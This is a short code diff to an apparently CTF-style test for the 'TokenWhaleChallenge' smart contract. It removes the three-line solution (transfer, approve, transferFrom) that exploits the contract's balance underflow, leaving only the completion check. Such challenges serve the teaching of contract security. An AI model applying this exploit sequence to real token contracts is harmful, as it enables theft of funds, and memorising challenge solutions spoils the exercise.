@@ -22,10 +22,6 @@ describe('TokenWhaleChallenge', () => {
   });
 
   it('exploit', async () => {
-    await target.transfer(attacker2.getAddress(), 1000);
-    await target.connect(attacker2).approve(attacker.getAddress(), 2000);
-    await target.transferFrom(attacker2.getAddress(), attacker2.getAddress(), 1000);
-
     expect(await target.isComplete()).to.equal(true);
   });
 });
